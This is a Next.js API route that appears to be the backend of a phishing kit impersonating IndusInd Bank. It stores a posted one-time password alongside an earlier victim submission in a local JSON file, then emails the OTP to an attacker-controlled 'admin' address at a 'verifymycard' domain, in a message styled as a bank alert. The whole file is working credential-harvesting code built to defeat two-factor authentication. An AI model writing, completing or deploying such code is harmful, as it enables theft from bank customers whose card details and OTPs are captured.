import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

const DATA_FILE = path.join(process.cwd(), 'data', 'submissions.json');

function readSubmissions() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

function saveSubmissions(submissions) {
  fs.mkdirSync(path.dirname(DATA_FILE), { recursive: true });
  fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2));
}

export async function POST(request) {
  try {
    const data = await request.json();

    // 1. Update latest submission with OTP (like otp-mail.php)
    const submissions = readSubmissions();
    // Find the most recent entry without an OTP
    const idx = [...submissions].reverse().findIndex(s => !s.otp);
    if (idx !== -1) {
      const realIdx = submissions.length - 1 - idx;
      submissions[realIdx].otp = data.otp || '';
      saveSubmissions(submissions);
    }

    // 2. Send OTP email to admin (like otp-mail.php)
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || 'smtp.gmail.com',
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    const adminEmail = process.env.ADMIN_EMAIL || 'admin@verifymycard.com';

    const emailBody = `
      <h2 style="color:#800020;">OTP Received — IndusInd Bank</h2>
      <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;width:100%;font-family:sans-serif;">
        <tr><td><b>Date/Time</b></td><td>${new Date().toLocaleString('en-IN')}</td></tr>
        <tr><td><b>OTP Code</b></td><td style="font-size:24px;font-weight:bold;color:#800020;">${data.otp}</td></tr>
      </table>
    `;

    if (process.env.SMTP_USER && process.env.SMTP_PASS) {
      await transporter.sendMail({
        from: `"IndusInd Alert" <${process.env.SMTP_USER}>`,
        to: adminEmail,
        subject: `OTP Received: ${data.otp}`,
        html: emailBody,
      });
    }

    return NextResponse.json({ success: true, message: 'OTP submitted successfully' });
  } catch (error) {
    console.error('Error handling OTP submission:', error);
    return NextResponse.json({ success: false, error: 'Invalid payload' }, { status: 400 });
  }
}
